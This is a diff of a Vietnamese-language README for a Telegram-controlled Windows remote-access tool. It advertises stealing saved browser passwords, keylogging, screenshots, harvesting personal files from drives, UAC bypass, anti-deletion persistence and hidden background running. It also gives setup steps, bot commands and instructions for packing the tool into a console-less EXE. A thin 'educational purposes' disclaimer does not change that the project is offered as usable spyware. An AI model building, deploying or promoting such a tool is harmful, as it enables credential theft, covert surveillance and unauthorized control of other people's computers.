@@ -1,74 +1,115 @@
 
-# Telegram Bot Điều Khiển Windows Từ Xa
-Một bot Telegram cho phép điều khiển và giám sát máy tính Windows từ xa thông qua các lệnh đơn giản. Bot này có thể thực hiện nhiều hành động như lấy mật khẩu trình duyệt, ghi lại phím nhấn (Keylogger), chụp màn hình, mở URL, và hơn thế nữa.
-Lưu ý: Script này chỉ hoạt động trên hệ điều hành Windows.
+# 🖥️ Telegram Bot Điều Khiển Windows Từ Xa
 
-## Tính Năng
+Một Telegram bot mạnh mẽ cho phép bạn giám sát và điều khiển máy tính Windows từ xa bằng các lệnh đơn giản qua Telegram. Hỗ trợ nhiều chức năng như lấy mật khẩu trình duyệt, keylogger, chụp màn hình, mở URL, và nhiều hơn nữa.
 
-🔑 Lấy mật khẩu từ các trình duyệt phổ biến như Chrome, Edge, Brave, CocCoc.
-⌨️ Ghi lại phím nhấn (keylogger) và gửi log qua Telegram.
-📸 Chụp màn hình và gửi qua Telegram.
-🌐 Mở URL trong trình duyệt Chrome.
-📂 Tìm và gửi các file quan trọng (.txt, .docx, .pdf, .jpg, .png) từ các ổ đĩa.
-🛑 Tắt máy hoặc khởi động lại máy.
-🔓 Bỏ qua UAC để chạy với quyền admin.
-💾 Tự sao lưu và chống xóa.
-🕵️ Ẩn console để hoạt động ngầm.
-💓 Heartbeat để xác nhận bot còn hoạt động.
+> ⚠️ **Chỉ hỗ trợ Windows.**
 
+---
 
-## Cài Đặt
+## 🚀 Tính Năng
 
-Cài đặt Python 3.x từ python.org.
-Cài đặt các thư viện cần thiết:pip install -r requirements.txt
+- 🔑 **Trích xuất mật khẩu** từ các trình duyệt phổ biến: Chrome, Edge, Brave, Cốc Cốc.
+- ⌨️ **Keylogger:** Ghi lại phím nhấn và gửi log về Telegram.
+- 📸 **Chụp màn hình** hiện tại và gửi qua Telegram.
+- 🌐 **Mở URL** bằng trình duyệt Chrome.
+- 📂 **Tìm kiếm và gửi file quan trọng** (.txt, .docx, .pdf, .jpg, .png).
+- 🛑 **Tắt máy / khởi động lại** từ xa.
+- 🔓 **Bypass UAC:** Tự động nâng quyền admin.
+- 💾 **Tự sao lưu và chống xóa.**
+- 🕵️ **Ẩn console**, chạy ngầm.
+- 💓 **Heartbeat:** Gửi tín hiệu để kiểm tra bot còn hoạt động.
 
+---
 
-Tạo bot Telegram:
-Tạo bot mới qua BotFather và lấy BOT_TOKEN.
-Lấy CHAT_ID của nhóm hoặc người dùng mà bot sẽ gửi tin nhắn đến.
+## 🧰 Cài Đặt
 
+### 1. Cài Python và Thư Viện
 
-Cập nhật script:
-Thay thế BOT_TOKEN và CHAT_ID trong file main.py.
+- Cài Python 3.x từ: https://www.python.org/
+- Cài các thư viện cần thiết:
+  ```bash
+  pip install -r requirements.txt
+  ```
 
+### 2. Tạo Bot Telegram
 
-Chạy script:python main.py
+- Dùng [BotFather](https://t.me/BotFather) để tạo bot mới.
+- Lấy **BOT_TOKEN** từ BotFather.
+- Lấy **CHAT_ID** của bạn hoặc nhóm nhận tin nhắn (có thể dùng [@userinfobot](https://t.me/userinfobot)).
 
+### 3. Cập Nhật Thông Tin Bot
 
+- Mở `main.py` và thay giá trị `BOT_TOKEN` và `CHAT_ID` tương ứng.
 
-Chú ý: Script sẽ tự động ẩn console và chạy ngầm. Nó cũng cố gắng bypass UAC để có quyền admin. Do tính chất của các hành động này, script có thể bị phát hiện bởi phần mềm diệt virus.
+### 4. Chạy Bot
 
-## Sử Dụng
-Sau khi bot đã chạy, bạn có thể gửi các lệnh sau đến bot qua Telegram:
+```bash
+python main.py
+```
 
-/lay_pass: Lấy mật khẩu từ trình duyệt.
-/lay_keylog: Xem log phím nhấn.
-/chup_man_hinh: Chụp màn hình.
-/mo_url <url>: Mở URL trong Chrome (ví dụ: /mo_url google.com).
-/lay_file: Tìm và gửi file quan trọng.
-/shutdown: Tắt máy.
-/restart: Khởi động lại máy.
-/help: Hiển thị danh sách lệnh.
+> 🔒 Bot sẽ tự ẩn console và chạy ngầm khi hoạt động. Có thể bị phát hiện bởi phần mềm antivirus.
 
+---
 
-🔧 Biến Script Thành EXE
-Để biến script thành file EXE độc lập, bạn có thể sử dụng PyInstaller:
+## 💬 Sử Dụng Bot
 
-Cài đặt PyInstaller:pip install pyinstaller
+Gửi lệnh đến bot trên Telegram:
 
+| Lệnh                | Mô tả                          |
+|---------------------|---------------------------------|
+| `/lay_pass`         | Lấy mật khẩu từ trình duyệt.    |
+| `/lay_keylog`       | Xem log phím nhấn.              |
+| `/chup_man_hinh`    | Chụp màn hình.                  |
+| `/mo_url <url>`     | Mở URL trên Chrome.             |
+| `/lay_file`         | Tìm và gửi file quan trọng.     |
+| `/shutdown`         | Tắt máy tính.                   |
+| `/restart`          | Khởi động lại máy.              |
+| `/help`             | Hiển thị danh sách lệnh.        |
 
-Chạy lệnh sau để biên dịch script:pyinstaller --onefile --noconsole main.py
+---
 
+## 🛠️ Biên Dịch Thành File EXE
 
-File EXE sẽ được tạo trong thư mục dist.
+Bạn có thể đóng gói bot thành file EXE:
 
-Lưu ý: Khi chạy file EXE, nó sẽ tự động ẩn console và chạy ngầm.
+### 1. Cài đặt PyInstaller
 
-⚠️ Tuyên Bố Từ Chối Trách Nhiệm
-Script này được tạo ra với mục đích giáo dục và thử nghiệm. Việc sử dụng script này để xâm nhập hoặc giám sát máy tính của người khác mà không có sự cho phép là bất hợp pháp và vi phạm đạo đức. Người dùng chịu hoàn toàn trách nhiệm về cách họ sử dụng script này.
+```bash
+pip install pyinstaller
+```
 
-🤝 Đóng Góp
-Nếu bạn muốn đóng góp vào dự án, vui lòng fork repository và gửi pull request với các cải tiến hoặc sửa lỗi.
+### 2. Build Script
 
-📜 Giấy Phép
-Script này được phát hành dưới giấy phép MIT.
+```bash
+pyinstaller --onefile --noconsole main.py
+```
+
+- File `.exe` sẽ nằm trong thư mục `dist/`.
+- Console sẽ không hiển thị khi chạy.
+
+---
+
+## ⚠️ Tuyên Bố Từ Chối Trách Nhiệm
+
+> Dự án này được tạo ra với mục đích **giáo dục** và **thử nghiệm**. Mọi hành vi sử dụng để xâm nhập hoặc giám sát người khác **mà không có sự cho phép** đều là **bất hợp pháp**. Người dùng chịu hoàn toàn trách nhiệm đối với hành vi sử dụng của mình.
+
+---
+
+## 🤝 Đóng Góp
+
+Bạn muốn cải thiện dự án? Hãy:
+
+- Fork repository
+- Commit thay đổi
+- Tạo pull request
+
+Mọi đóng góp đều được hoan nghênh.
+
+---
+
+## 📜 Giấy Phép
+
+Phát hành dưới [Giấy Phép MIT](LICENSE).
+
+---
